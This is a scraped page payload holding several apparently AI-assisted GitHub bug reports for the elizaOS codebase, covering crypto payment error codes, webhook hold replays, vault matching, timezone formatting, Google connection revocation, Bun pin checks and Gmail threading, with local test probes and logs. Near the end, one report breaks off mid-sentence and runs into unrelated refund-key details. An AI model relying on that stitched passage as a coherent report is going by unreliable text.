n 1 and 10,000). So `10.005` reaches the service, and the route maps `AMOUNT_TOO_LARGE` to 400 `{\"error\":\"Amount too large\"}` (`:95`). `NaN` and `Infinity` cannot arrive in JSON; they reach the service only from direct callers.\n- Consumers: the route is the only code that maps `CryptoPaymentError` codes (`:88-106`; any unmapped code falls through to a 500 at `:102-105`). The billing UI (`packages/ui/src/cloud/billing/components/billing-tab.tsx:429`) and the `plugin-elizacloud` billing proxy (`plugins/plugin-elizacloud/src/routes/cloud-billing-routes.ts:730-742`) show or pass through the `error` text without switching on codes. The other validator caller, `direct-wallet-payments.ts:1468-1469`, throws the message as a plain `Error`, and its route returns it as a 400 (`packages/cloud/api/crypto/direct-payments/route.ts:80-84`), so that path does not misclassify.\n\nThe repository error policy asks for typed errors and warns against branching on prose. This classification is an example: adding the third rejection message changed the error code without anyone touching the classifier.\n\n**To Reproduce**\n\nI mounted the real `packages/cloud/api/crypto/payments/route.ts` and called the real `cryptoPaymentsService.createPayment` from `packages/cloud/api` on `origin/develop` `4573712ebf`. Only session auth and the rate limiter were stubbed. `OXAPAY_MERCHANT_API_KEY` was set to a local placeholder so that `isOxaPayConfigured()` passes. `oxaPayService.createInvoice` was spied to throw, and it was never called.\n\n\u003cdetails\u003e\u003csummary\u003eProbe (scratch file \u003ccode\u003epackages/cloud/api/__tests__/zz-amount-probe.test.ts\u003c/code\u003e, not committed)\u003c/summary\u003e\n\n```ts\nprocess.env.DATABASE_URL = \"pglite://memory\";\nprocess.env.TEST_DATABASE_URL = \"pglite://memory\";\nprocess.env.NODE_ENV = \"test\";\nprocess.env.OXAPAY_MERCHANT_API_KEY = \"local-probe-placeholder\";\n\nconst organizationId = randomUUID();\nmock.module(\"@/lib/auth/workers-hono-auth\", () =\u003e ({\n  requireUserWithOrg: async () =\u003e ({ id: randomUUID(), organization_id: organizationId }),\n  requireUserOrApiKeyWithOrg: async () =\u003e ({ id: randomUUID(), organization_id: organizationId }),\n}));\nmock.module(\"@/lib/middleware/rate-limit-hono-cloudflare\", () =\u003e ({\n  moneyRateLimit: () =\u003e async (_c: unknown, next: () =\u003e Promise\u003cvoid\u003e) =\u003e next(),\n  rateLimit: () =\u003e async (_c: unknown, next: () =\u003e Promise\u003cvoid\u003e) =\u003e next(),\n  RateLimitPresets: { STRICT: {}, STANDARD: {} },\n}));\nconst { default: route } = await import(\"../crypto/payments/route\");\nconst { cryptoPaymentsService } = await import(\"@/lib/services/crypto-payments\");\nconst { oxaPayService } = await import(\"@/lib/services/oxapay\");\nconst invoice = spyOn(oxaPayService, \"createInvoice\").mockImplementation(async () =\u003e {\n  throw new Error(\"probe: no OxaPay invoice expected\");\n});\n\ntest(\"probe\", async () =\u003e {\n  for (const amount of [\"10.005\", 10.005, \"4.99\", \"1000.01\"]) {\n    const res = await route.request(\"/\", {\n      method: \"POST\",\n      headers: { \"content-type\": \"application/json\" },\n      body: JSON.stringify({ amount }),\n    });\n    console.log(\"ROUTE\", JSON.stringify({ amount, status: res.status, body: await res.json() }));\n  }\n  for (const amount of [\"10.005\", Number.NaN, Number.POSITIVE_INFINITY, \"4.99\", \"1000.01\"]) {\n    const outcome = await cryptoPaymentsService.createPayment({ organizationId, amount }).then(\n      () =\u003e ({ resolved: true }),\n      (error: { code?: string; message?: string }) =\u003e ({ code: error.code, message: error.message }),\n    );\n    console.log(\"SERVICE\", JSON.stringify({ amount: String(amount), ...outcome }));\n  }\n  console.log(\"OXAPAY_INVOICE_CALLS\", invoice.mock.calls.length);\n  expect(invoice).not.toHaveBeenCalled();\n});\n```\n\n\u003c/details\u003e\n\nFrom `packages/cloud/api` (Bun 1.3.14, Node 24.15.0):\n\n```\n$ bun test --conditions=eliza-source __tests__/zz-amount-probe.test.ts --timeout 60000\nROUTE {\"amount\":\"10.005\",\"status\":400,\"body\":{\"error\":\"Amount too large\"}}\nROUTE {\"amount\":10.005,\"status\":400,\"body\":{\"error\":\"Amount too large\"}}\nROUTE {\"amount\":\"4.99\",\"status\":400,\"body\":{\"error\":\"Amount too small\"}}\nROUTE {\"amount\":\"1000.01\",\"status\":400,\"body\":{\"error\":\"Amount too large\"}}\nSERVICE {\"amount\":\"10.005\",\"code\":\"AMOUNT_TOO_LARGE\",\"message\":\"Amount must be a finite USD amount in whole cents\"}\nSERVICE {\"amount\":\"NaN\",\"code\":\"AMOUNT_TOO_LARGE\",\"message\":\"Amount must be a finite USD amount in whole cents\"}\nSERVICE {\"amount\":\"Infinity\",\"code\":\"AMOUNT_TOO_LARGE\",\"message\":\"Amount must be a finite USD amount in whole cents\"}\nSERVICE {\"amount\":\"4.99\",\"code\":\"AMOUNT_TOO_SMALL\",\"message\":\"Amount must be at least $5\"}\nSERVICE {\"amount\":\"1000.01\",\"code\":\"AMOUNT_TOO_LARGE\",\"message\":\"Amount must not exceed $1000\"}\nOXAPAY_INVOICE_CALLS 0\n 1 pass\n 0 fail\n```\n\n\u003cdetails\u003e\u003csummary\u003eRoute log for the \u003ccode\u003e10.005\u003c/code\u003e request (paths shortened)\u003c/summary\u003e\n\n```\n[Crypto Payments API] Create payment error: 315 |\n316 |     if (!validation.valid) {\n317 |       const errorCode = validation.error?.includes(\"at least\")\n318 |         ? \"AMOUNT_TOO_SMALL\"\n319 |         : \"AMOUNT_TOO_LARGE\";\n320 |       throw new CryptoPaymentError(errorCode, validation.error || \"Invalid amount\");\nCryptoPaymentError: Amount must be a finite USD amount in whole cents\n      at createPayment (packages/cloud/shared/src/lib/services/crypto-payments.ts:320:17)\n```\n\n\u003c/details\u003e\n\nA $10.005 request, which is below the $1,000 maximum, is answered \"Amount too large\". The error's own message says the actual problem is whole cents.\n\n**Expected behavior**\n\n- The validator returns a typed reason alongside its message, and the service maps that reason to a code without reading the message.\n- An amount that is not a finite whole-cent value gets its own code, for example `AMOUNT_INVALID`. The route answers 400 with a message that says what is wrong.\n- Below-minimum and above-maximum amounts keep `AMOUNT_TOO_SMALL` and `AMOUNT_TOO_LARGE`, with their current messages and 400 responses.\n\n**Screenshots / recording of the wrong behavior (required for anything visible)**\n\nN/A - API error classification with no rendered surface of its own. The UI only shows the route's `error` text in a toast. The route and service transcript above is the proof.\n\n**Evidence / reproduction proof**\n\n- [x] MP4 recording or JPG screenshots of the broken behavior: N/A - no visible surface of its own; see the route and service transcript.\n- [x] Backend logs and frontend console/network logs when relevant: route log above; N/A for frontend (the UI does not branch on the code).\n- [x] Real-LLM trajectory when the bug involves agent/action/prompt/model behavior: N/A - no model, prompt or action is involved.\n- [x] Domain artifacts when relevant: the HTTP status and body for each amount, and the `CryptoPaymentError` code and message from the real service, both in the transcript above.\n\n**Additional context**\n\n- The route's schema bounds (`route.ts:33-34`, $1 to $10,000) are looser than the service's limits ($5 to $1,000, `ORGANIZATION_CREDIT_CHECKOUT_LIMITS`). The service enforces the real bounds, so this report does not change them.\n- Because JSON cannot carry `NaN` or `Infinity`, the HTTP-reachable case is an amount with more than two decimal places. The same misclassification applies to any direct caller of `createPayment`.\n\n**Contribution provenance**\n\n\u003c!-- contribution-attribution:v1 --\u003e\n\u003c!-- attribution-row:ai-assistance --\u003e\n- AI assistance: `yes`\n\u003c!-- attribution-row:models --\u003e\n- Model(s) used: `anthropic/claude-opus-5-5`\n\u003c!-- attribution-row:client --\u003e\n- Agent tooling: `Claude Code`\n\u003c!-- attribution-row:skill-revision --\u003e\n- Skill path: `elizaOS/army@46fa4776ba6bd0df2e7236c95a3c77e69cd1db99:skills/contribute-to-eliza`\n\u003c!-- attribution-row:status --\u003e\n- Provenance status: `self-reported`\n\nAI provider/model: anthropic / claude-opus-5-5\nClient / agent tooling: Claude Code\nContribution skill revision: elizaOS/army@46fa4776ba6bd0df2e7236c95a3c77e69cd1db99:skills/contribute-to-eliza\nAttribution status: self-reported\n— [nxn-claude-code]\n\u003c!-- eliza-computer-attribution:v1 {\"provider\":\"anthropic\",\"model\":\"claude-opus-5-5\",\"client\":\"Claude Code\",\"skill_revision\":\"elizaOS/army@46fa4776ba6bd0df2e7236c95a3c77e69cd1db99:skills/contribute-to-eliza\"} --\u003e\n"])</script><script>self.__next_f.push([1,"46:T2634,"])</script><script>self.__next_f.push([1,"**Describe the bug**\n\nTwo replay defects remain in the durable connector hold after #32909 (head `bc812ab321`). Both are in `packages/cloud/services/gateway-webhook`, and both only affect Blooio and Twilio turns that the gateway has already acknowledged to the provider.\n\n1. **A non-retryable Cloud refusal is retried for the whole hold budget.** `redeliverHeldWebhook` re-holds every `PersonalSharedPreEgressError` (`src/webhook-handler.ts:949-956`). That includes failures that Cloud itself classified as `retryable: false`: a 4xx, or `X-Eliza-Retryable: false`, as read by `readPersonalSharedFailureMetadata` (`packages/cloud/services/_common/src/personal-shared-failure.ts:100-102`, `:127-132`). The refused turn is sent to Cloud again on every drain for `CUTOVER_HOLD_MAX_MS` (one hour). It is then logged as `Held personal connector turn exceeded the cutover budget`, with the stale `holdCode: personal_cutover_in_progress` and the operator action \"inspect the Dedicated target's attestation\". A first-delivery failure of the same kind is settled at once by `settleBackgroundDeliveryFailure`.\n2. **A delivered hold is replayed after its lease lapses.** `drainCutoverHolds` removes a settled record only while the lease still holds this drainer's token (`src/cutover-hold.ts:250`). Suppose renewal fails for a whole lease period and no other replica takes the lease. The turn is delivered and the ledger says `delivered`, but the record and its index entry stay. The next drain runs the Cloud turn and the provider send a second time.\n\n**To Reproduce**\n\nI ran the real handler and drainer (`handleWebhook`, `drainCutoverHolds`, `redeliverHeldWebhook`, `releaseExpiredHeldWebhook`) against a local `Bun.serve` stub of the Cloud personal-shared route and the in-memory Redis adapter (`MOCK_REDIS=1`, ioredis-mock). Only the Blooio provider API is substituted. The probe drives the same setup that `__tests__/cutover-hold.test.ts` uses. A signed Blooio webhook arrives while Cloud answers `503 personal_cutover_in_progress`, so the turn is held and the ledger is `held`. Then:\n\n- P2b: Cloud is attested. While the attested turn runs, the lease key is deleted (it expired with no new owner). The probe runs one drain, then a second drain.\n- P3: Cloud starts answering `400 {\"code\":\"invalid_request\"}` (`retryable: false`). The probe runs one drain at `now + 60s`, then a drain after the hold budget (`now + CUTOVER_HOLD_MAX_MS + 120s`).\n\n\u003cdetails\u003e\u003csummary\u003eProbe P2b and P3 (added to \u003ccode\u003e__tests__/\u003c/code\u003e of a checkout at \u003ccode\u003ebc812ab321\u003c/code\u003e)\u003c/summary\u003e\n\n`startCloud`, `holdOne`, `drainHandlers` and `providerSends` are the same helpers as in `__tests__/cutover-hold.test.ts`. `holdOne` sends one signed Blooio webhook and waits for the `held` ledger. The Cloud stub's `permanentStatus` returns that status with `{\"success\":false,\"code\":\"invalid_request\"}`.\n\n```ts\ntest(\"P2b a delivered outcome whose lease simply expired (no replacement) is replayed\", async () =\u003e {\n  const cloud = startCloud();\n  const redis = await holdOne(cloud, \"msg_probe_p2b\");\n  const dedupKey = \"webhook:blooio:msg_probe_p2b\";\n  const leaseKey = `webhook:cutover-hold-lease:${dedupKey}`;\n  const heldTurns = cloud.turns.length;\n  cloud.state.attested = true;\n  cloud.state.onAttestedTurn = async () =\u003e {\n    await redis.del(leaseKey);\n  };\n  const first = await drainCutoverHolds(redis, drainHandlers(cloud.origin, redis), { now: Date.now() + 60_000 });\n  const ledgerAfterFirst = await redis.get(dedupKey);\n  cloud.state.onAttestedTurn = undefined;\n  const second = await drainCutoverHolds(redis, drainHandlers(cloud.origin, redis), { now: Date.now() + 120_000 });\n  console.log(\"P2b\", JSON.stringify({ first, ledgerAfterFirst, second, turns: cloud.turns.length - heldTurns, sends: providerSends.length }));\n}, 60_000);\n\ntest(\"P3 a permanent non-hold Cloud 400 is retried until the hour budget, then released\", async () =\u003e {\n  const cloud = startCloud();\n  const redis = await holdOne(cloud, \"msg_probe_p3\");\n  const dedupKey = \"webhook:blooio:msg_probe_p3\";\n  cloud.state.permanentStatus = 400;\n  const retry = await drainCutoverHolds(redis, drainHandlers(cloud.origin, redis), { now: Date.now() + 60_000 });\n  const ledgerAfterRetry = await redis.get(dedupKey);\n  const expired = await drainCutoverHolds(redis, drainHandlers(cloud.origin, redis), { now: Date.now() + CUTOVER_HOLD_MAX_MS + 120_000 });\n  const ledgerAfterExpiry = await redis.get(dedupKey);\n  console.log(\"P3\", JSON.stringify({ retry, ledgerAfterRetry, expired, ledgerAfterExpiry, sends: providerSends.length }));\n}, 60_000);\n```\n\n\u003c/details\u003e\n\nFrom `packages/cloud/services/gateway-webhook` (Bun 1.3.14, Node 24.15.0):\n\n```\n$ bun test --conditions=eliza-source __tests__/zz-review-probe.test.ts\nP2b {\"first\":{\"delivered\":0,\"rescheduled\":0,\"released\":0,\"expired\":0},\"ledgerAfterFirst\":\"delivered\",\"second\":{\"delivered\":1,\"rescheduled\":0,\"released\":0,\"expired\":0},\"turns\":2,\"sends\":2}\nP3 {\"retry\":{\"delivered\":0,\"rescheduled\":1,\"released\":0,\"expired\":0},\"ledgerAfterRetry\":\"held\",\"expired\":{\"delivered\":0,\"rescheduled\":0,\"released\":0,\"expired\":1},\"ledgerAfterExpiry\":null,\"sends\":0}\n 4 pass\n 0 fail\nRan 4 tests across 1 file. [9.48s]\n```\n\n\u003cdetails\u003e\u003csummary\u003eGateway logs for the two probes (abridged to the lines that matter)\u003c/summary\u003e\n\n```\n{\"level\":\"info\",\"message\":\"Held personal connector turn delivered after cutover\",\"platform\":\"blooio\",\"messageId\":\"msg_probe_p2b\",\"heldForMs\":7,\"attempts\":1}\n{\"level\":\"info\",\"message\":\"Held personal connector turn delivered after cutover\",\"platform\":\"blooio\",\"messageId\":\"msg_probe_p2b\",\"heldForMs\":11,\"attempts\":1}\n{\"level\":\"warn\",\"message\":\"Personal Shared Cloud attempt failed\",\"platform\":\"blooio\",\"messageId\":\"msg_probe_p3\",\"attempt\":1,\"status\":400,\"retryable\":false}\n{\"level\":\"error\",\"message\":\"Held personal connector turn exceeded the cutover budget\",\"platform\":\"blooio\",\"messageId\":\"msg_probe_p3\",\"holdCode\":\"personal_cutover_in_progress\",\"operatorAction\":\"inspect the Dedicated target's attestation; the turn was never executed\"}\n{\"level\":\"error\",\"message\":\"Background message processing failed\",\"error\":\"cutover hold expired\",\"platform\":\"blooio\",\"messageId\":\"msg_probe_p3\"}\n```\n\n\u003c/details\u003e\n\nP2b reports the same turn as delivered twice, with two Cloud turns and two provider sends. The first drain reports `delivered: 0`, although the ledger already reads `delivered`. P3 reschedules the refused turn instead of releasing it, and settles it only through the expiry path.\n\n**Expected behavior**\n\n- A redelivery that Cloud refuses with a non-retryable classification is settled at once, the same way the first background delivery settles it. `settleBackgroundDeliveryFailure` logs the failure at error level. Because no provider egress happened, it also reopens the dedup key. The drain reports `released: 1`, and later drains do nothing. Cutover holds and failures without a non-retryable classification (transport errors, 5xx) stay held, as #32909 intends.\n- A redelivery whose outcome is settled removes its record unless another replica now owns the lease. A lease that simply lapsed does not keep the record. P2b should give one Cloud turn and one provider send, with the first drain reporting `delivered: 1`.\n\n**Screenshots / recording of the wrong behavior (required for anything visible)**\n\nN/A - server-side gateway queue behaviour with no rendered surface; the probe transcript and gateway logs above are the proof.\n\n**Evidence / reproduction proof**\n\n- [x] MP4 recording or JPG screenshots of the broken behavior: N/A - no visible surface; see the probe transcript.\n- [x] Backend logs and frontend console/network logs when relevant: gateway logs above; N/A for frontend (no UI).\n- [x] Real-LLM trajectory when the bug involves agent/action/prompt/model behavior: N/A - no model call; the Cloud route is a local stub.\n- [x] Domain artifacts when relevant: the Redis ledger values and drain statistics in the probe transcript.\n\n**Additional context**\n\n- The #32909 review notes that the Telegram private no-reply failure (`src/webhook-handler.ts:1703-1705`, `retryable: false`) reaches this path. It does not in practice. Telegram webhooks return inside the Telegram branch (`src/webhook-handler.ts:630-713`) before the hold code (`:773-778`), so only Blooio and Twilio turns are ever held. The reachable cases are Blooio and Twilio turns that Cloud refuses with a 4xx or `X-Eliza-Retryable: false` after a hold.\n- A related case is not covered here. A different replica takes the lease mid-turn and then dies without draining (probe P2 in the #32909 review). The first drainer then correctly declines to remove the record, and it is replayed once that replica's lease lapses. Guarding against it would mean checking the dedup ledger before redelivery. It needs a lease stolen by a live owner, which lease renewal is designed to prevent.\n\n**Contribution provenance**\n\n\u003c!-- contribution-attribution:v1 --\u003e\n\u003c!-- attribution-row:ai-assistance --\u003e\n- AI assistance: `yes`\n\u003c!-- attribution-row:models --\u003e\n- Model(s) used: `anthropic/claude-opus-5-5`\n\u003c!-- attribution-row:client --\u003e\n- Agent tooling: `Claude Code`\n\u003c!-- attribution-row:skill-revision --\u003e\n- Skill path: `elizaOS/army@46fa4776ba6bd0df2e7236c95a3c77e69cd1db99:skills/contribute-to-eliza`\n\u003c!-- attribution-row:status --\u003e\n- Provenance status: `self-reported`\n\nAI provider/model: anthropic / claude-opus-5-5\nClient / agent tooling: Claude Code\nContribution skill revision: elizaOS/army@46fa4776ba6bd0df2e7236c95a3c77e69cd1db99:skills/contribute-to-eliza\nAttribution status: self-reported\n— [nxn-claude-code]\n\u003c!-- eliza-computer-attribution:v1 {\"provider\":\"anthropic\",\"model\":\"claude-opus-5-5\",\"client\":\"Claude Code\",\"skill_revision\":\"elizaOS/army@46fa4776ba6bd0df2e7236c95a3c77e69cd1db99:skills/contribute-to-eliza\"} --\u003e\n"])</script><script>self.__next_f.push([1,"47:T69b,"])</script><script>self.__next_f.push([1,"## Problem\n\nThe shipped `STEER_LIQUIDITY` wallet provider can report unrelated Steer vaults for a token-address query.\n\n`SteerLiquidityService.getTokenLiquidityStats()` treats any vault with a `poolAddress` as a token match, even when neither `token0` nor `token1` equals the requested address. If an address has no direct matches, the same method then falls back to every vault on the selected chain. The provider renders those vaults under `FOUND ... VAULTS` for the requested token, producing materially incorrect wallet analytics.\n\n## Reproduction\n\nInvoke the production service method with a deterministic Steer SDK boundary containing:\n\n- one vault whose `token0` equals `0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa`\n- one unrelated vault with different `token0`/`token1`\n- a `poolAddress` on both vaults, matching the real SDK shape\n\nCurrent result:\n\n```json\n{\n  \"known\": [\n    \"0x1111111111111111111111111111111111111111\",\n    \"0x2222222222222222222222222222222222222222\"\n  ],\n  \"unknown\": [\n    \"0x1111111111111111111111111111111111111111\",\n    \"0x2222222222222222222222222222222222222222\"\n  ]\n}\n```\n\nThe known address should return only the first vault. The unknown address should return no vaults.\n\n## Acceptance criteria\n\n- Token-address searches include only vaults whose `token0` or `token1` address equals the requested address, case-insensitively.\n- A `poolAddress` alone never proves token membership.\n- An explicit token-address query with no matches returns an empty result instead of falling back to all chain vaults.\n- Symbol/general overview behavior remains unchanged.\n- Regression coverage exercises the public service path for both a matching and an unknown address.\n"])</script><script>self.__next_f.push([1,"48:T4b9,## Problem\n\nThe standalone agent's `CONTACT` action schedules follow-ups as the requested instant, but its success message formats `scheduledAt` with bare `Date#toLocaleString()`. The confirmation therefore uses the host process timezone rather than the owner/calendar timezone.\n\nThis is owner-visible and host-dependent. For `scheduledAt=2026-08-20T23:00:00.000Z` with `TIMEZONE=America/Los_Angeles`:\n\n- `TZ=UTC` reports `Scheduled follow-up with contact for 8/20/2026, 11:00:00 PM.`\n- `TZ=America/New_York` reports `Scheduled follow-up with contact for 8/20/2026, 7:00:00 PM.`\n- The owner-local time is `8/20/2026, 4:00:00 PM`.\n\nThe persisted `scheduledAt` remains the correct ISO instant; only the action result shown to the owner is wrong.\n\n## Location\n\n`packages/agent/src/actions/contact.ts`, `handleFollowup` success text.\n\n## Acceptance criteria\n\n- Resolve the canonical calendar timezone before scheduling the follow-up.\n- Format the owner-visible confirmation in that explicit timezone.\n- Keep the persisted/scheduled ISO instant unchanged.\n- Prove the output is invariant under at least two different host `TZ` values.\n- Ensure timezone-resolution failure occurs before the scheduling side effect.\n49:Tc2f,"])</script><script>self.__next_f.push([1,"## Defect\n\n`disconnectManagedGoogleConnection` (`packages/cloud/shared/src/lib/services/agent-google-connector/shared.ts:547-566`) falls through to `connections[0]` when an **explicit** `connectionId` matches nothing:\n\n```ts\nconst activeConnection =\n  (args.connectionId\n    ? connections.find((connection) =\u003e connection.id === args.connectionId)\n    : getPreferredActiveConnection(connections, args.userId, args.side)) ??\n  connections[0] ??        // \u003c- explicit-but-unknown id lands here\n  null;\n```\n\nA caller who passes a stale, wrong, or cross-side UUID — with otherwise valid authentication — gets **HTTP 200 `{ok:true}`** while a *different* connection (the first in the scoped list) is revoked. The explicit-id contract (\"disconnect THIS one\") silently degrades into \"disconnect whatever is first.\"\n\nThis is the `shared.ts:555-558` fallthrough flagged independently during #33090 review — outside that PR's body-validation scope, so filed separately as promised.\n\n## Reproduction (logic path, current `develop`)\n\n1. Authenticate as a user with ≥1 managed owner-side Google connection (id `A`).\n2. `POST /api/v1/eliza/google/disconnect` with a well-formed but nonexistent UUID: `{\"connectionId\":\"3f1c2a4e-0000-4000-8000-000000000000\"}`.\n3. The route parses fine (valid UUID), the connector's `find` returns `undefined`, and `?? connections[0]` selects connection `A`.\n4. **Result: 200 `{ok:true}` and connection `A` is revoked.**\n\nSame call shape, second connection `B` present and listed first: the caller intended to remove nothing that exists, and `B` is destroyed.\n\n## Expected behavior\n\n- An **explicit** `connectionId` that matches nothing in the caller's scoped connections → `AgentGoogleConnectorError` 404 (`Google connection not found.`), **no revoke** — exactly the contract the same file already implements for explicit-grant lookup in `getConnectionStatus` (`shared.ts:479`: `fail(404, \"Google connection not found.\")`).\n- Omitted/null `connectionId` keeps today's disconnect-active-or-first behavior unchanged.\n- The route already maps `AgentGoogleConnectorError` to its status (verified in `disconnect/route.ts` catch), so the 404 propagates with no route changes.\n\n## Acceptance\n\n- `{\"connectionId\": \"\u003cwell-formed unknown uuid\u003e\"}` with scoped connections present → 404, zero `revokeConnection` calls.\n- `{\"connectionId\": \"\u003cknown uuid\u003e\"}` → 200, that connection revoked (unchanged).\n- Empty body / `{}` / `{\"connectionId\": null}` → 200, active-or-first revoked (unchanged).\n- No scoped connections + explicit id → 404 (not the silent no-op `return` the current code takes).\n\n## Evidence\n\n- Server-only API behavior; connector call ledger from the #33090 review thread documents the same silent-revoke class for malformed bodies (this issue is the explicit-id half).\n- Reviewed head: `develop` `8113...` (2026-10-02), function verified unchanged by the 11 commits between `27dec7b0c3` and current develop.\n\n\u003c!-- eliza-computer-attribution:v1 {\"provider\":\"nvidia\",\"model\":\"z-ai/glm-5.3\",\"client\":\"Hermes Agent\",\"skill_revision\":\"local:slop-eliza/skills/slop-cash-contribute\"} --\u003e"])</script><script>self.__next_f.push([1,"4a:T9a5,"])</script><script>self.__next_f.push([1,"Requested by review on #33047 (hermesagent270-commits, Prabhat1308, nothingxnowhere): the install-boundary Bun pin guard needs a focused issue to own its acceptance criteria.\n\n## Scope\n\nThe root-postinstall Bun pin guard must reflect the real install boundary: two Bun runtimes participate in an install and each can be off-pin independently.\n\n1. **Installer runtime.** The binary that resolved dependencies and wrote `bun.lock` is exposed to lifecycle scripts as `npm_execpath`. Checking only the `bun` on PATH let an off-pin installer pass because a pinned child masked it (reproduced in the #33047 reviews with two real binaries, both directions). The guard must validate the installer identity from `npm_execpath` and fail closed when it cannot be established (missing, not executable, or not a Bun).\n2. **Postinstall runtime.** The `bun` resolved from PATH runs the patch/build chain and must stay checked (its `Bun.build` output differs across versions).\n3. **Honest claims.** The guard runs as the first postinstall link, so it fires after dependency resolution: an off-pin install has already extracted packages and may have rewritten `bun.lock`. Failure output must say so, name the restore step (`git checkout -- bun.lock`), and lead with a platform-neutral remediation (official installer, pinned version) instead of a Linux-only bootstrap.\n\n## Acceptance criteria\n\n- A lifecycle integration test launches one Bun executable while `PATH` resolves another and proves: an off-pin installer cannot pass via a pinned PATH bun, and a pinned installer is not rejected because an off-pin bun happens to be on PATH (the failure names the postinstall runtime, not the installer).\n- The install wiring is tested: the guard is the first root-postinstall link.\n- Non-Bun installers (npm/pnpm/yarn launchers) and a missing `npm_execpath` fail closed in install context.\n- The decision rejects every non-pinned concrete release (including `1.4.10` vs pin `1.4.2` and prerelease/build-suffixed variants) and its rationale matches the actual comparison.\n\n## Evidence plan\n\n- Real two-binary transcript (off-pin 1.3.14 installer + pinned 1.4.2 PATH, and the reverse) from the lifecycle test, captured in the PR.\n- Real npm-installer refusal transcript.\n- `bun --config=packages/scripts/bunfig.script-tests.toml test --conditions=eliza-source packages/scripts/check-bun-runtime-pin.test.ts` green, Biome (pinned 2.5.14) clean.\n\nResolves the process blocker recorded on #33047."])</script><script>self.__next_f.push([1,"4b:Taf1,"])</script><script>self.__next_f.push([1,"## Problem\n\nReminder delivery renders the reminder's due time in the **host** timezone in two owner-visible places in `plugins/plugin-personal-assistant/src/lifeops/domains/reminders-service.ts`:\n\n1. `buildReminderDispatchPrompt` (the model-facing dispatch prompt) formats `- due:` with `new Date(args.reminderAt).toLocaleString()` — no `timeZone`. The model writes owner copy anchored to the server's wall clock, so with a UTC host and an `America/Los_Angeles` owner a 4:00 PM PDT reminder is described to the model as \"11:00 PM\".\n2. `renderReminderBody`'s deterministic fallback calls `buildReminderBody` **without** the `timezone` it already supports, so the fallback body (\"Due: …\") is host-local too. This fallback is what owners actually receive whenever `TEXT_SMALL` is unavailable, returns unusable text, or throws.\n\n`dispatchReminderAttempt` already resolves and carries `timezone: string`, and the exact in-app one-time path passes it through (`buildReminderBody({ ...args, … })`), so the value is in scope at both call sites — it is simply dropped.\n\nThis is the same defect family as #33155 (cadence summaries), but a different file and path: delivered reminder copy and the reminder dispatch prompt. #33164's fix touches only `actions/life.ts`.\n\n## Reproduction\n\nCurrent `develop`: `3248f87109353350b3721127bfaebaf8f081a740`; `reminders-service.ts` blob `3fb32700f87af20197e257d9a74d1f2509124b3c`.\n\nOwner timezone `America/Los_Angeles`; reminder due `2026-08-20T23:00:00.000Z` (4:00 PM PDT). Calling the exported `buildReminderBody` (as `renderReminderBody` does, without `timezone`) and `buildReminderDispatchPrompt`:\n\n- host `TZ=UTC`: `Due: 8/20/2026, 11:00:00 PM` and `- due: 8/20/2026, 11:00:00 PM`\n- host `TZ=America/New_York`: `Due: 8/20/2026, 7:00:00 PM` and `- due: 8/20/2026, 7:00:00 PM`\n\nExpected in both environments: `4:00 PM` (the owner's wall clock).\n\n## Acceptance criteria\n\n- `buildReminderDispatchPrompt` renders `- due:` in the explicit definition/draft timezone when one is provided, and is invariant across host `TZ` values.\n- `renderReminderBody` threads the owner timezone into both the fallback body and the prompt; `dispatchReminderAttempt` passes its `timezone` through.\n- Omitted timezone keeps today's behavior (no format change for callers that do not supply one).\n- Focused regressions cover the prompt formatter, the fallback body, and the `dispatchReminderAttempt → renderReminderBody` threading.\n\n## Duplication check\n\nOpen issue/PR searches for reminder dispatch timezone formatting found no matching work. #33155/#33164 cover cadence summaries in `actions/life.ts`; #33117 covers quiet-hours DST; #33122 covers calendar-day bounds; #33096 touches reminder plans/controls and UI widgets, not these formatters; #33107 classifies reminder replies.\n"])</script><script>self.__next_f.push([1,"4c:T598,"])</script><script>self.__next_f.push([1,"## Problem\n\nGmail replies sent from Personal Assistant inbox triage and the LifeOps Gmail reply endpoint can arrive as new conversations instead of remaining in the source thread.\n\nOn `develop`, the adapter drops the source `threadId` before `users.messages.send`, reads `metadata.references` even though the Gmail mapper stores `referencesHeader`, and can send a reply without the identifiers required to prove the parent message. The LifeOps HTTP path similarly sends with a thread id but omits the RFC reply chain.\n\nThis is user-visible: an owner replies from Eliza, but Gmail and recipient mail clients may show a separate conversation.\n\n## Acceptance criteria\n\n- Every Gmail reply send requires a non-empty source `threadId` and parent `Message-ID`; missing values fail before any send.\n- `users.messages.send` receives the source `threadId` on its Message resource.\n- `In-Reply-To` contains the parent Message-ID.\n- `References` contains the stored `referencesHeader` chain followed by the parent Message-ID.\n- Personal Assistant inbox triage and LifeOps HTTP reply sends use the same invariant.\n- New outbound messages remain unthreaded and send `{ raw }` only.\n- Regression tests cover the production mapper/adapter/client field names and fail-closed paths.\n\n## Duplicate check\n\nNo matching issue was found for Gmail reply `threadId`, `sendGmailReply`, or `referencesHeader`. PR #33158 is the implementation for this issue.\n"])</script><script>self.__next_f.push([1,"4d:T8d8,"])</script><script>self.__next_f.push([1,"## Problem\n\nThe LIFE action formats one-time cadences with `resolveDefaultTimeZone()`, so reminder reviews, confirmations, and duplicate-title resolution use the server timezone instead of the definition owner's timezone.\n\nThis is not only presentation drift. Duplicate-title destructive resolution extracts clock tokens from that host-local summary, so it can delete the wrong reminder.\n\n## Reproduction\n\nCurrent `develop`: `502e068eb2b31cf0bf963b90802b5ad05ed3dec0`.\n\nThe affected `life.ts` blob (`0371c6e212d10b95477eb01a48e2b6d160833b33`) is byte-identical to the commit used for the action-boundary reproduction.\n\nWith host `TZ=UTC`, owner/definitions in `America/Los_Angeles`, and two reminders named `Call dentist`:\n\n- `owner-9am`: `2026-08-20T16:00:00.000Z` (09:00 PDT)\n- `owner-4pm`: `2026-08-20T23:00:00.000Z` (16:00 PDT)\n\nRunning the exported `runLifeOperationHandler` for “delete the Call dentist reminder at 4pm” deleted `owner-9am` and returned `Deleted \"Call dentist\" and its occurrences.`\n\nThe same exported review path rendered the 09:00 PDT reminder as:\n\n- host `TZ=UTC`: `once on Aug 20, 4:00 PM`\n- host `TZ=America/New_York`: `once on Aug 20, 12:00 PM`\n\nExpected in both environments: `once on Aug 20, 9:00 AM`.\n\nThe harness uses the 23-125`: a refund key that fails the `^[A-Za-z0-9][A-Za-z0-9._:-]{7,127}$` pattern throws `CryptoRefundError(\"CRYPTO_REFUND_INVALID_AMOUNT\", \"Refund key is invalid\")`.\n- `:193-197`: a refund key that was already used for a different amount throws `CryptoRefundError(\"CRYPTO_REFUND_INVALID_AMOUNT\", \"Refund key was already used for a different amount\")`.\n- `:126-131` is the actual amount check, which throws the same code with \"Refund amount must be a 